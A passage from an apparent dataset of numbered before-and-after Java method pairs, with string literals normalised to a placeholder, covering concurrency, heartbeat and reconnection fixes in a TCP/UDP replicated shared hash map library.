synchronized (closeables) {
    client.bind(hostAddress);
    if (LOG.isDebugEnabled())     LOG.debug(""String_Node_Str"" + port);
    closeables.add(client);
  }
  return client;
}"
91304,"@Before public void setup() throws IOException {
  map2=newUdpSocketShmIntString(2,1234);
  try {
    Thread.sleep(500);
  }
 catch (  InterruptedException e) {
    e.printStackTrace();
  }
}","@Before public void setup() throws IOException {
  map2=newUdpSocketShmIntString(1,1234);
  try {
    Thread.sleep(500);
  }
 catch (  InterruptedException e) {
    e.printStackTrace();
  }
}"
91305,"@Test @Ignore public void testBufferOverflow() throws IOException, InterruptedException {
  for (int i=0; i < 1024; i++) {
    Thread.sleep(1000);
    System.out.println(""String_Node_Str"" + map2);
  }
}","@Test @Ignore public void testBufferOverflow() throws IOException, InterruptedException {
  for (int i=0; i < 1024; i++) {
    Thread.sleep(5000);
    map2.put(i * 2,""String_Node_Str"");
    System.out.println(""String_Node_Str"" + map2);
  }
}"
91306,"/** 
 * {@inheritDoc}This method does not set a segment lock, A segment lock should be obtained before calling this method, especially when being used in a multi threaded context.
 */
@Override public void readExternalEntry(@NotNull Bytes source){
  final long keyLen=source.readStopBit();
  final long valueLen=source.readStopBit();
  final long timeStamp=source.readStopBit();
  final byte id=source.readByte();
  final byte remoteIdentifier;
  final boolean isDeleted;
  if (id < 0) {
    isDeleted=true;
    remoteIdentifier=(byte)-id;
  }
 else   if (id != 0) {
    isDeleted=false;
    remoteIdentifier=id;
  }
 else {
    throw new IllegalStateException(""String_Node_Str"");
  }
  if (remoteIdentifier == VanillaSharedReplicatedHashMap.this.identifier()) {
    return;
  }
  final long keyPosition=source.position();
  final long keyLimit=keyPosition + keyLen;
  source.limit(keyLimit);
  long hash=Hasher.hash(source);
  int segmentNum=hasher.getSegment(hash);
  int segmentHash=hasher.segmentHash(hash);
  boolean debugEnabled=LOG.isDebugEnabled();
  if (isDeleted) {
    if (debugEnabled) {
      LOG.debug(""String_Node_Str"",localIdentifier,remoteIdentifier,AbstractBytes.toString(source).trim());
    }
    segment(segmentNum).remoteRemove(source,segmentHash,timeStamp,remoteIdentifier);
    setLastModificationTime(remoteIdentifier,timeStamp);
    return;
  }
  String message=null;
  if (debugEnabled) {
    message=String.format(""String_Node_Str"",localIdentifier,remoteIdentifier,AbstractBytes.toString(source).trim());
  }
  final long valuePosition=keyLimit;
  final long valueLimit=valuePosition + valueLen;
  segment(segmentNum).remotePut(source,segmentHash,remoteIdentifier,timeStamp,valuePosition,valueLimit);
  setLastModificationTime(remoteIdentifier,timeStamp);
  if (debugEnabled) {
    source.limit(valueLimit);
    source.position(valuePosition);
    LOG.debug(message + ""String_Node_Str"" + AbstractBytes.toString(source).trim()+ ""String_Node_Str"");
  }
}","/** 
 * {@inheritDoc}This method does not set a segment lock, A segment lock should be obtained before calling this method, especially when being used in a multi threaded context.
 */
@Override public void readExternalEntry(@NotNull Bytes source){
  final long keyLen=source.readStopBit();
  final long valueLen=source.readStopBit();
  final long timeStamp=source.readStopBit();
  final byte id=source.readByte();
  final byte remoteIdentifier;
  final boolean isDeleted;
  if (id < 0) {
    isDeleted=true;
    remoteIdentifier=(byte)-id;
  }
 else   if (id != 0) {
    isDeleted=false;
    remoteIdentifier=id;
  }
 else {
    throw new IllegalStateException(""String_Node_Str"");
  }
  if (remoteIdentifier == VanillaSharedReplicatedHashMap.this.identifier()) {
    return;
  }
  final long keyPosition=source.position();
  final long keyLimit=keyPosition + keyLen;
  source.limit(keyLimit);
  long hash=Hasher.hash(source);
  int segmentNum=hasher.getSegment(hash);
  int segmentHash=hasher.segmentHash(hash);
  boolean debugEnabled=LOG.isDebugEnabled();
  if (isDeleted) {
    if (debugEnabled) {
      LOG.debug(""String_Node_Str"",localIdentifier,remoteIdentifier,source.toString().trim());
    }
    segment(segmentNum).remoteRemove(source,segmentHash,timeStamp,remoteIdentifier);
    setLastModificationTime(remoteIdentifier,timeStamp);
    return;
  }
  String message=null;
  if (debugEnabled) {
    message=String.format(""String_Node_Str"",localIdentifier,remoteIdentifier,source.toString().trim());
  }
  final long valuePosition=keyLimit;
  final long valueLimit=valuePosition + valueLen;
  segment(segmentNum).remotePut(source,segmentHash,remoteIdentifier,timeStamp,valuePosition,valueLimit);
  setLastModificationTime(remoteIdentifier,timeStamp);
  if (debugEnabled) {
    source.limit(valueLimit);
    source.position(valuePosition);
    LOG.debug(message + ""String_Node_Str"" + source.toString().trim()+ ""String_Node_Str"");
  }
}"
91307,"/** 
 * update that are throttled are rejected.
 * @param socketChannel             the socketChannel that we will write to
 * @param modificationIterator      modificationIterator that relates to this channel
 * @param throttleMegaBytesPer100ms mega bytes per 100ms
 * @throws InterruptedException
 * @throws IOException
 */
void writeAll(@NotNull final DatagramChannel socketChannel,@NotNull final ModificationIterator modificationIterator,final long throttleMegaBytesPer100ms) throws InterruptedException, IOException {
  out.clear();
  in.clear();
  in.skip(2);
  final boolean wasDataRead=modificationIterator.nextEntry(entryCallback);
  if (!wasDataRead)   return;
  in.writeShort(0,~(in.readUnsignedShort(2)));
  out.limit((int)in.position());
  try {
    if (throttleMegaBytesPer100ms == 0) {
      socketChannel.write(out);
      return;
    }
    if (byteWritten > throttleMegaBytesPer100ms) {
      final long currentTimeMillis=System.currentTimeMillis();
      if (time + 100 <= currentTimeMillis) {
        if (LOG.isDebugEnabled())         LOG.debug(""String_Node_Str"");
        return;
      }
      time=currentTimeMillis;
    }
    byteWritten+=socketChannel.write(out);
  }
 catch (  IOException e) {
    if (LOG.isDebugEnabled())     LOG.debug(""String_Node_Str"",e);
  }
}","/** 
 * update that are throttled are rejected.
 * @param socketChannel             the socketChannel that we will write to
 * @param modificationIterator      modificationIterator that relates to this channel
 * @param throttleMegaBytesPer100ms mega bytes per 100ms
 * @throws InterruptedException
 * @throws IOException
 */
void writeAll(@NotNull final DatagramChannel socketChannel,@NotNull final ModificationIterator modificationIterator,final long throttleMegaBytesPer100ms) throws InterruptedException, IOException {
  out.clear();
  in.clear();
  in.skip(2);
  final boolean wasDataRead=modificationIterator.nextEntry(entryCallback);
  if (!wasDataRead)   return;
  in.writeShort(0,~(in.readUnsignedShort(2)));
  out.limit((int)in.position());
  try {
    if (throttleMegaBytesPer100ms == 0) {
      socketChannel.write(out);
      return;
    }
    if (byteWritten + out.remaining() > throttleMegaBytesPer100ms) {
      final long currentTimeMillis=System.currentTimeMillis();
      if (time + 100 > currentTimeMillis) {
        if (LOG.isDebugEnabled()) {
          LOG.debug(""String_Node_Str"");
        }
        out.clear();
        in.clear();
        byteWritten=0;
        return;
      }
      time=currentTimeMillis;
    }
    byteWritten+=socketChannel.write(out);
  }
 catch (  IOException e) {
    if (LOG.isDebugEnabled())     LOG.debug(""String_Node_Str"",e);
  }
}"
91308,"public void run(){
  try {
    if (details.reconnectionInterval > 0)     Thread.sleep(details.reconnectionInterval);
    final SelectableChannel socketChannel=connect();
    if (socketChannel == null)     return;
    details.closeables.add(socketChannel);
    details.pendingRegistrations.add(socketChannel);
  }
 catch (  InterruptedException e) {
  }
catch (  IOException e) {
    LOG.error(""String_Node_Str"",e);
  }
}","public void run(){
  try {
    if (details.reconnectionInterval > 0)     Thread.sleep(details.reconnectionInterval);
synchronized (details.closeables) {
      final SelectableChannel socketChannel=connect();
      if (socketChannel == null)       return;
      details.closeables.add(socketChannel);
      details.pendingRegistrations.add(socketChannel);
    }
  }
 catch (  InterruptedException e) {
  }
catch (  IOException e) {
    LOG.error(""String_Node_Str"",e);
  }
}"
91309,"private void onRead(final ReplicatedSharedHashMap map,final SelectionKey key,final long approxTime) throws IOException, InterruptedException {
  final SocketChannel socketChannel=(SocketChannel)key.channel();
  final Attached attached=(Attached)key.attachment();
  if (attached.entryReader.readSocketToBuffer(socketChannel) <= 0)   return;
  attached.entryReader.lastHeartBeatReceived=approxTime;
  if (attached.isHandShakingComplete())   attached.entryReader.entriesFromBuffer();
 else   doHandShaking(map,attached);
}","private void onRead(final ReplicatedSharedHashMap map,final SelectionKey key,final long approxTime) throws IOException, InterruptedException {
  final SocketChannel socketChannel=(SocketChannel)key.channel();
  final Attached attached=(Attached)key.attachment();
  if (attached.entryReader.readSocketToBuffer(socketChannel,map.identifier(),this.pendingRegistrations,connector) <= 0)   return;
  attached.entryReader.lastHeartBeatReceived=approxTime;
  if (attached.isHandShakingComplete())   attached.entryReader.entriesFromBuffer();
 else   doHandShaking(map,attached);
}"
91310,"/** 
 * reads from the socket and writes the contents to the buffer
 * @param socketChannel the  socketChannel to read from
 * @return the number of bytes read
 * @throws IOException
 */
private int readSocketToBuffer(@NotNull final SocketChannel socketChannel) throws IOException {
  compactBuffer();
  final int len=socketChannel.read(in);
  out.limit(in.position());
  return len;
}","/** 
 * reads from the socket and writes the contents to the buffer
 * @param socketChannel        the  socketChannel to read from
 * @param identifier
 * @param pendingRegistrations
 * @param connector1
 * @return the number of bytes read
 * @throws IOException
 */
private int readSocketToBuffer(@NotNull final SocketChannel socketChannel,final byte identifier,final Queue<SelectableChannel> pendingRegistrations,final Connector connector1) throws IOException {
  compactBuffer();
  try {
    final int len=socketChannel.read(in);
    out.limit(in.position());
    return len;
  }
 catch (  IOException e) {
    connector1.asyncReconnect(identifier,socketChannel.socket(),pendingRegistrations);
    throw e;
  }
}"
91311,"@Override public void close() throws IOException {
  for (  Closeable closeable : this.closeables) {
    try {
      closeable.close();
    }
 catch (    IOException e) {
      LOG.error(""String_Node_Str"",e);
    }
  }
  closeables.clear();
  executorService.shutdownNow();
  selector.close();
}","@Override public void close() throws IOException {
synchronized (this.closeables) {
    for (    Closeable closeable : this.closeables) {
      try {
        closeable.close();
      }
 catch (      IOException e) {
        LOG.error(""String_Node_Str"",e);
      }
    }
  }
  closeables.clear();
  executorService.shutdownNow();
  selector.close();
}"
91312,"/** 
 * blocks until connected
 */
SelectableChannel connect() throws IOException, InterruptedException {
  boolean success=false;
  for (; ; ) {
    final SocketChannel socketChannel=SocketChannel.open();
    try {
      socketChannel.configureBlocking(false);
      socketChannel.socket().setReuseAddress(false);
      socketChannel.socket().setSoLinger(false,0);
      socketChannel.socket().setSoTimeout(0);
      socketChannel.socket().setTcpNoDelay(true);
      details.closeables.add(socketChannel.socket());
      socketChannel.connect(details.address);
      details.closeables.add(socketChannel);
      if (LOG.isDebugEnabled())       LOG.debug(""String_Node_Str"",details.address,details.identifier);
      success=true;
      return socketChannel;
    }
 catch (    IOException e) {
      throw e;
    }
 finally {
      if (!success)       try {
        try {
          socketChannel.socket().close();
        }
 catch (        Exception e) {
          LOG.error(""String_Node_Str"",e);
        }
        socketChannel.close();
      }
 catch (      IOException e) {
        LOG.error(""String_Node_Str"",e);
      }
    }
  }
}","/** 
 * blocks until connected
 */
SelectableChannel connect() throws IOException, InterruptedException {
  boolean success=false;
  for (; ; ) {
    final SocketChannel socketChannel=SocketChannel.open();
    try {
      socketChannel.configureBlocking(false);
      socketChannel.socket().setReuseAddress(false);
      socketChannel.socket().setSoLinger(false,0);
      socketChannel.socket().setSoTimeout(0);
      socketChannel.socket().setTcpNoDelay(true);
synchronized (details.closeables) {
        details.closeables.add(socketChannel.socket());
        socketChannel.connect(details.address);
        details.closeables.add(socketChannel);
      }
      if (LOG.isDebugEnabled())       LOG.debug(""String_Node_Str"",details.address,details.identifier);
      success=true;
      return socketChannel;
    }
 catch (    IOException e) {
      throw e;
    }
 finally {
      if (!success)       try {
        try {
          socketChannel.socket().close();
        }
 catch (        Exception e) {
          LOG.error(""String_Node_Str"",e);
        }
        socketChannel.close();
      }
 catch (      IOException e) {
        LOG.error(""String_Node_Str"",e);
      }
    }
  }
}"
91313,"private void process(@NotNull final ReplicatedSharedHashMap map,final int serializedEntrySize,@NotNull final EntryExternalizable externalizable,@NotNull final TcpReplicatorBuilder tcpReplicatorBuilder) throws IOException {
  final byte identifier=map.identifier();
  final short packetSize=tcpReplicatorBuilder.packetSize();
  try {
    final Queue<SelectableChannel> pendingRegistrations=connector.asyncConnect(identifier,tcpReplicatorBuilder.endpoints(),tcpReplicatorBuilder.serverInetSocketAddress());
    for (; ; ) {
      register(pendingRegistrations);
      if (!selector.isOpen())       return;
      final int nSelectedKeys=selector.select(100);
      if (nSelectedKeys == 0) {
        continue;
      }
      final long approxTime=System.currentTimeMillis();
      final long heartBeatInterval=tcpReplicatorBuilder.heartBeatInterval();
      final long approxTimeOutTime=approxTime - (long)(heartBeatInterval * 1.10);
      final Set<SelectionKey> selectedKeys=selector.selectedKeys();
      for (      final SelectionKey key : selectedKeys) {
        try {
          if (!key.isValid())           continue;
          if (key.isAcceptable())           doAccept(key,serializedEntrySize,externalizable,packetSize,map.identifier(),heartBeatInterval);
          if (key.isConnectable())           onConnect(packetSize,serializedEntrySize,externalizable,key,map.identifier(),pendingRegistrations,heartBeatInterval);
          if (key.isReadable())           onRead(map,key,approxTime);
          if (key.isWritable())           onWrite(key,approxTime);
          checkHeartbeat(key,approxTimeOutTime,identifier,pendingRegistrations);
        }
 catch (        CancelledKeyException e) {
          quietClose(key,e);
        }
catch (        ClosedSelectorException e) {
          quietClose(key,e);
        }
catch (        ClosedChannelException e) {
          quietClose(key,e);
        }
catch (        ConnectException e) {
          quietClose(key,e);
        }
catch (        Exception e) {
          LOG.info(""String_Node_Str"",e);
          close(key);
        }
      }
      selectedKeys.clear();
    }
  }
 catch (  ClosedSelectorException e) {
    if (LOG.isDebugEnabled())     LOG.debug(""String_Node_Str"",e);
  }
catch (  ClosedChannelException e) {
    if (LOG.isDebugEnabled())     LOG.debug(""String_Node_Str"",e);
  }
catch (  ConnectException e) {
    if (LOG.isDebugEnabled())     LOG.debug(""String_Node_Str"",e);
  }
catch (  Exception e) {
    LOG.error(""String_Node_Str"",e);
  }
 finally {
    if (selector != null)     try {
      selector.close();
    }
 catch (    IOException e) {
      if (LOG.isDebugEnabled())       LOG.debug(""String_Node_Str"",e);
    }
    close();
  }
}","private void process(@NotNull final ReplicatedSharedHashMap map,final int serializedEntrySize,@NotNull final EntryExternalizable externalizable,@NotNull final TcpReplicatorBuilder tcpReplicatorBuilder) throws IOException {
  final byte identifier=map.identifier();
  final short packetSize=tcpReplicatorBuilder.packetSize();
  try {
    pendingRegistrations=connector.asyncConnect(identifier,tcpReplicatorBuilder.endpoints(),tcpReplicatorBuilder.serverInetSocketAddress());
    for (; ; ) {
      register(pendingRegistrations);
      if (!selector.isOpen())       return;
      final int nSelectedKeys=selector.select(100);
      if (nSelectedKeys == 0) {
        continue;
      }
      final long approxTime=System.currentTimeMillis();
      final long heartBeatInterval=tcpReplicatorBuilder.heartBeatInterval();
      final long approxTimeOutTime=approxTime - (long)(heartBeatInterval * 1.10);
      final Set<SelectionKey> selectedKeys=selector.selectedKeys();
      for (      final SelectionKey key : selectedKeys) {
        try {
          if (!key.isValid())           continue;
          if (key.isAcceptable())           onAccept(key,serializedEntrySize,externalizable,packetSize,map.identifier(),heartBeatInterval);
          if (key.isConnectable())           onConnect(packetSize,serializedEntrySize,externalizable,key,map.identifier(),pendingRegistrations,heartBeatInterval);
          if (key.isReadable())           onRead(map,key,approxTime);
          if (key.isWritable())           onWrite(key,approxTime);
          checkHeartbeat(key,approxTimeOutTime,identifier,pendingRegistrations);
        }
 catch (        CancelledKeyException e) {
          quietClose(key,e);
        }
catch (        ClosedSelectorException e) {
          quietClose(key,e);
        }
catch (        IOException e) {
          quietClose(key,e);
        }
catch (        Exception e) {
          LOG.info(""String_Node_Str"",e);
          close(key);
        }
      }
      selectedKeys.clear();
    }
  }
 catch (  ClosedSelectorException e) {
    if (LOG.isDebugEnabled())     LOG.debug(""String_Node_Str"",e);
  }
catch (  ClosedChannelException e) {
    if (LOG.isDebugEnabled())     LOG.debug(""String_Node_Str"",e);
  }
catch (  ConnectException e) {
    if (LOG.isDebugEnabled())     LOG.debug(""String_Node_Str"",e);
  }
catch (  Exception e) {
    LOG.error(""String_Node_Str"",e);
  }
 finally {
    if (selector != null)     try {
      selector.close();
    }
 catch (    IOException e) {
      if (LOG.isDebugEnabled())       LOG.debug(""String_Node_Str"",e);
    }
    close();
  }
}"
91314,"private DatagramChannel connectClient(final int port) throws IOException {
  final DatagramChannel client=DatagramChannel.open();
  final InetSocketAddress hostAddress=new InetSocketAddress(port);
  client.configureBlocking(false);
  client.bind(hostAddress);
  if (LOG.isDebugEnabled())   LOG.debug(""String_Node_Str"" + port);
  closeables.add(client);
  return client;
}","private DatagramChannel connectClient(final int port) throws IOException {
  final DatagramChannel client=DatagramChannel.open();
  final InetSocketAddress hostAddress=new InetSocketAddress(port);
  client.configureBlocking(false);
synchronized (closeables) {
    client.bind(hostAddress);
    if (LOG.isDebugEnabled())     LOG.debug(""String_Node_Str"" + port);
    closeables.add(client);
  }
  return client;
}"
91315,"@Override public void close(){
  executorService.shutdownNow();
  for (  Closeable closeable : closeables) {
    try {
      closeable.close();
    }
 catch (    IOException e) {
      LOG.error(""String_Node_Str"",e);
    }
  }
}","@Override public void close(){
  executorService.shutdownNow();
synchronized (closeables) {
    for (    Closeable closeable : closeables) {
      try {
        closeable.close();
      }
 catch (      IOException e) {
        LOG.error(""String_Node_Str"",e);
      }
    }
  }
}"
91316,"SelectableChannel connect() throws IOException, InterruptedException {
  final DatagramChannel server=DatagramChannel.open();
  server.socket().setBroadcast(true);
  server.configureBlocking(false);
  try {
    server.connect(details.address);
  }
 catch (  IOException e) {
    details.reconnectionInterval=100;
    reconnect(server);
    return null;
  }
  server.setOption(StandardSocketOptions.SO_REUSEADDR,true).setOption(StandardSocketOptions.IP_MULTICAST_LOOP,false).setOption(StandardSocketOptions.SO_BROADCAST,true).setOption(StandardSocketOptions.SO_REUSEADDR,true);
  details.closeables.add(server);
  return server;
}","SelectableChannel connect() throws IOException, InterruptedException {
  final DatagramChannel server=DatagramChannel.open();
  server.socket().setBroadcast(true);
  server.configureBlocking(false);
  try {
synchronized (details.closeables) {
      server.connect(details.address);
      details.closeables.add(server);
    }
  }
 catch (  IOException e) {
    details.reconnectionInterval=100;
    reconnect(server);
    return null;
  }
  server.setOption(StandardSocketOptions.SO_REUSEADDR,true).setOption(StandardSocketOptions.IP_MULTICAST_LOOP,false).setOption(StandardSocketOptions.SO_BROADCAST,true).setOption(StandardSocketOptions.SO_REUSEADDR,true);
  return server;
}"
91317,"@Test @Ignore public void testContinueToReceive() throws IOException, InterruptedException {
  for (; ; ) {
    for (int i=0; i < 1024; i++) {
      Thread.sleep(1000);
      map1.put(i * 2,""String_Node_Str"");
      System.out.println(map1);
    }
  }
}","@Test @Ignore public void testContinueToReceive() throws IOException, InterruptedException {
  for (; ; ) {
    for (int i=0; i < 1024; i++) {
      Thread.sleep(1000);
      System.out.println(map1);
    }
  }
}"
91318,"private void process(@NotNull final ReplicatedSharedHashMap map,final int serializedEntrySize,@NotNull final EntryExternalizable externalizable,@NotNull final TcpReplicatorBuilder tcpReplicatorBuilder) throws IOException {
  final byte identifier=map.identifier();
  final short packetSize=tcpReplicatorBuilder.packetSize();
  try {
    connector.asyncConnect(identifier,tcpReplicatorBuilder.endpoints(),tcpReplicatorBuilder.serverInetSocketAddress());
    for (; ; ) {
      register(pendingRegistrations);
      if (!selector.isOpen())       return;
      final int nSelectedKeys=selector.select(100);
      if (nSelectedKeys == 0) {
        continue;
      }
      final long approxTime=System.currentTimeMillis();
      final long heartBeatInterval=tcpReplicatorBuilder.heartBeatInterval();
      final long approxTimeOutTime=approxTime + (long)(heartBeatInterval * 1.10);
      final Set<SelectionKey> selectedKeys=selector.selectedKeys();
      for (      final SelectionKey key : selectedKeys) {
        try {
          if (!key.isValid())           continue;
          if (key.isAcceptable())           onAccept(key,serializedEntrySize,externalizable,packetSize,map.identifier(),heartBeatInterval);
          if (key.isConnectable())           onConnect(packetSize,serializedEntrySize,externalizable,key,map.identifier(),heartBeatInterval);
          if (key.isReadable())           onRead(map,key,approxTime);
          if (key.isWritable())           onWrite(key,approxTime);
          checkHeartbeat(key,approxTimeOutTime,identifier,pendingRegistrations);
        }
 catch (        CancelledKeyException e) {
          quietClose(key,e);
        }
catch (        ClosedSelectorException e) {
          quietClose(key,e);
        }
catch (        IOException e) {
          quietClose(key,e);
        }
catch (        Exception e) {
          LOG.info(""String_Node_Str"",e);
          close(key);
        }
      }
      selectedKeys.clear();
    }
  }
 catch (  ClosedSelectorException e) {
    if (LOG.isDebugEnabled())     LOG.debug(""String_Node_Str"",e);
  }
catch (  ClosedChannelException e) {
    if (LOG.isDebugEnabled())     LOG.debug(""String_Node_Str"",e);
  }
catch (  ConnectException e) {
    if (LOG.isDebugEnabled())     LOG.debug(""String_Node_Str"",e);
  }
catch (  Exception e) {
    LOG.error(""String_Node_Str"",e);
  }
 finally {
    if (selector != null)     try {
      selector.close();
    }
 catch (    IOException e) {
      if (LOG.isDebugEnabled())       LOG.debug(""String_Node_Str"",e);
    }
    close();
  }
}","private void process(@NotNull final ReplicatedSharedHashMap map,final int serializedEntrySize,@NotNull final EntryExternalizable externalizable,@NotNull final TcpReplicatorBuilder tcpReplicatorBuilder) throws IOException {
  final byte identifier=map.identifier();
  final short packetSize=tcpReplicatorBuilder.packetSize();
  try {
    connector.asyncConnect(identifier,tcpReplicatorBuilder.endpoints(),tcpReplicatorBuilder.serverInetSocketAddress());
    for (; ; ) {
      register(pendingRegistrations);
      if (!selector.isOpen())       return;
      final int nSelectedKeys=selector.select(100);
      if (nSelectedKeys == 0) {
        continue;
      }
      final long approxTime=System.currentTimeMillis();
      final long heartBeatInterval=tcpReplicatorBuilder.heartBeatInterval();
      final Set<SelectionKey> selectedKeys=selector.selectedKeys();
      for (      final SelectionKey key : selectedKeys) {
        try {
          if (!key.isValid())           continue;
          if (key.isAcceptable())           onAccept(key,serializedEntrySize,externalizable,packetSize,map.identifier(),heartBeatInterval);
          if (key.isConnectable())           onConnect(packetSize,serializedEntrySize,externalizable,key,map.identifier(),heartBeatInterval);
          if (key.isReadable())           onRead(map,key,approxTime);
          if (key.isWritable())           onWrite(key,approxTime);
          checkHeartbeat(key,approxTime,identifier,(long)(heartBeatInterval * 1.10));
        }
 catch (        CancelledKeyException e) {
          quietClose(key,e);
        }
catch (        ClosedSelectorException e) {
          quietClose(key,e);
        }
catch (        IOException e) {
          quietClose(key,e);
        }
catch (        Exception e) {
          LOG.info(""String_Node_Str"",e);
          close(key);
        }
      }
      selectedKeys.clear();
    }
  }
 catch (  ClosedSelectorException e) {
    if (LOG.isDebugEnabled())     LOG.debug(""String_Node_Str"",e);
  }
catch (  ClosedChannelException e) {
    if (LOG.isDebugEnabled())     LOG.debug(""String_Node_Str"",e);
  }
catch (  ConnectException e) {
    if (LOG.isDebugEnabled())     LOG.debug(""String_Node_Str"",e);
  }
catch (  Exception e) {
    LOG.error(""String_Node_Str"",e);
  }
 finally {
    if (selector != null)     try {
      selector.close();
    }
 catch (    IOException e) {
      if (LOG.isDebugEnabled())       LOG.debug(""String_Node_Str"",e);
    }
    close();
  }
}"
91319,"private void checkHeartbeat(SelectionKey key,final long timeOutTime,final byte identifier,final Queue<SelectableChannel> pendingRegistrations) throws ConnectException {
  final Attached attached=(Attached)key.attachment();
  if (key.channel() == serverSocketChannel || attached == null)   return;
  if (!attached.isHandShakingComplete())   return;
  final SocketChannel channel=(SocketChannel)key.channel();
  if (timeOutTime < attached.entryReader.lastHeartBeatReceived) {
    connector.asyncReconnect(identifier,channel.socket());
    throw new ConnectException(""String_Node_Str"" + attached.remoteIdentifier + ""String_Node_Str"");
  }
}","private void checkHeartbeat(SelectionKey key,final long approxTimeOutTime,final byte identifier,final double timeout) throws ConnectException {
  final Attached attached=(Attached)key.attachment();
  if (key.channel() == serverSocketChannel || attached == null)   return;
  if (!attached.isHandShakingComplete())   return;
  final SocketChannel channel=(SocketChannel)key.channel();
  if (approxTimeOutTime > attached.entryReader.lastHeartBeatReceived + timeout) {
    connector.asyncReconnect(identifier,channel.socket());
    throw new ConnectException(""String_Node_Str"" + attached.remoteIdentifier + ""String_Node_Str"");
  }
}"
91320,"public static <T extends SharedHashMap<Integer,CharSequence>>T newTcpSocketShmIntString(final byte identifier,final int serverPort,final InetSocketAddress... InetSocketAddress) throws IOException {
  final TcpReplicatorBuilder tcpReplicatorBuilder=new TcpReplicatorBuilder(serverPort,InetSocketAddress).heartBeatInterval(1000);
  return (T)new SharedHashMapBuilder().entries(1000).identifier(identifier).tcpReplication(tcpReplicatorBuilder).entries(20000).create(getPersistenceFile(),Integer.class,CharSequence.class);
}","public static <T extends SharedHashMap<Integer,CharSequence>>T newTcpSocketShmIntString(final byte identifier,final int serverPort,final InetSocketAddress... InetSocketAddress) throws IOException {
  final TcpReplicatorBuilder tcpReplicatorBuilder=new TcpReplicatorBuilder(serverPort,InetSocketAddress).heartBeatInterval(100);
  return (T)new SharedHashMapBuilder().entries(1000).identifier(identifier).tcpReplication(tcpReplicatorBuilder).entries(20000).create(getPersistenceFile(),Integer.class,CharSequence.class);
}"
91321,"private void onRead(final ReplicatedSharedHashMap map,final SelectionKey key,final long approxTime) throws IOException, InterruptedException {
  final SocketChannel socketChannel=(SocketChannel)key.channel();
  final Attached attached=(Attached)key.attachment();
  if (attached.entryReader.readSocketToBuffer(socketChannel) <= 0)   return;
  if (attached.isHandShakingComplete())   attached.entryReader.entriesFromBuffer(approxTime);
 else   doHandShaking(map,attached,approxTime);
}","private void onRead(final ReplicatedSharedHashMap map,final SelectionKey key,final long approxTime) throws IOException, InterruptedException {
  final SocketChannel socketChannel=(SocketChannel)key.channel();
  final Attached attached=(Attached)key.attachment();
  if (attached.entryReader.readSocketToBuffer(socketChannel) <= 0)   return;
  attached.entryReader.lastHeartBeatReceived=approxTime;
  if (attached.isHandShakingComplete())   attached.entryReader.entriesFromBuffer();
 else   doHandShaking(map,attached,approxTime);
}"
91322,"/** 
 * reads from the socket and writes the contents to the buffer
 * @param socketChannel the  socketChannel to read from
 * @return the number of bytes read
 * @throws IOException
 */
int readSocketToBuffer(@NotNull final SocketChannel socketChannel) throws IOException {
  compactBuffer();
  final int len=socketChannel.read(in);
  out.limit(in.position());
  return len;
}","/** 
 * reads from the socket and writes the contents to the buffer
 * @param socketChannel the  socketChannel to read from
 * @return the number of bytes read
 * @throws IOException
 */
private int readSocketToBuffer(@NotNull final SocketChannel socketChannel) throws IOException {
  compactBuffer();
  final int len=socketChannel.read(in);
  out.limit(in.position());
  return len;
}"
91323,"/** 
 * reads entries from the socket till it is empty
 * @param approxTime
 * @throws InterruptedException
 */
void entriesFromBuffer(final long approxTime) throws InterruptedException {
  for (; ; ) {
    out.limit(in.position());
    if (sizeOfNextEntry == Integer.MIN_VALUE) {
      if (out.remaining() < SIZE_OF_UNSIGNED_SHORT) {
        return;
      }
      sizeOfNextEntry=out.readUnsignedShort();
    }
    if (sizeOfNextEntry == 0) {
      lastHeartBeatReceived=approxTime;
      continue;
    }
    if (out.remaining() < sizeOfNextEntry) {
      return;
    }
    final long nextEntryPos=out.position() + sizeOfNextEntry;
    final long limit=out.limit();
    out.limit(nextEntryPos);
    externalizable.readExternalEntry(out);
    out.limit(limit);
    out.position(nextEntryPos);
    sizeOfNextEntry=Integer.MIN_VALUE;
  }
}","/** 
 * reads entries from the socket till it is empty
 * @throws InterruptedException
 */
private void entriesFromBuffer() throws InterruptedException {
  for (; ; ) {
    out.limit(in.position());
    if (sizeOfNextEntry == Integer.MIN_VALUE) {
      if (out.remaining() < SIZE_OF_UNSIGNED_SHORT) {
        return;
      }
      sizeOfNextEntry=out.readUnsignedShort();
    }
    if (sizeOfNextEntry == 0)     continue;
    if (out.remaining() < sizeOfNextEntry) {
      return;
    }
    final long nextEntryPos=out.position() + sizeOfNextEntry;
    final long limit=out.limit();
    out.limit(nextEntryPos);
    externalizable.readExternalEntry(out);
    out.limit(limit);
    out.position(nextEntryPos);
    sizeOfNextEntry=Integer.MIN_VALUE;
  }
}"
91324,"/** 
 * used to exchange identifiers and timestamps between the server and client
 * @param map
 * @param attached
 * @param approxTime
 * @throws java.io.IOException
 * @throws InterruptedException
 */
private void doHandShaking(final ReplicatedSharedHashMap map,final Attached attached,final long approxTime) throws IOException, InterruptedException {
  if (attached.remoteIdentifier == Byte.MIN_VALUE) {
    final byte remoteIdentifier=attached.entryReader.identifierFromBuffer();
    if (remoteIdentifier != Byte.MIN_VALUE) {
      attached.remoteIdentifier=remoteIdentifier;
      if (LOG.isDebugEnabled()) {
        LOG.debug(""String_Node_Str"",map.identifier(),remoteIdentifier);
      }
      if (remoteIdentifier == map.identifier())       throw new IllegalStateException(""String_Node_Str"" + map.identifier());
      attached.remoteModificationIterator=map.acquireModificationIterator(remoteIdentifier);
      attached.entryWriter.timestampToBuffer(map.lastModificationTime(remoteIdentifier));
    }
  }
  if (attached.remoteIdentifier != Byte.MIN_VALUE && attached.remoteTimestamp == Long.MIN_VALUE) {
    attached.remoteTimestamp=attached.entryReader.timeStampFromBuffer();
    if (attached.remoteTimestamp != Long.MIN_VALUE) {
      attached.remoteModificationIterator.dirtyEntries(attached.remoteTimestamp);
      attached.setHandShakingComplete();
      attached.entryReader.entriesFromBuffer(approxTime);
    }
  }
}","/** 
 * used to exchange identifiers and timestamps between the server and client
 * @param map
 * @param attached
 * @param approxTime
 * @throws java.io.IOException
 * @throws InterruptedException
 */
private void doHandShaking(final ReplicatedSharedHashMap map,final Attached attached,final long approxTime) throws IOException, InterruptedException {
  if (attached.remoteIdentifier == Byte.MIN_VALUE) {
    final byte remoteIdentifier=attached.entryReader.identifierFromBuffer();
    if (remoteIdentifier != Byte.MIN_VALUE) {
      attached.remoteIdentifier=remoteIdentifier;
      if (LOG.isDebugEnabled()) {
        LOG.debug(""String_Node_Str"",map.identifier(),remoteIdentifier);
      }
      if (remoteIdentifier == map.identifier())       throw new IllegalStateException(""String_Node_Str"" + map.identifier());
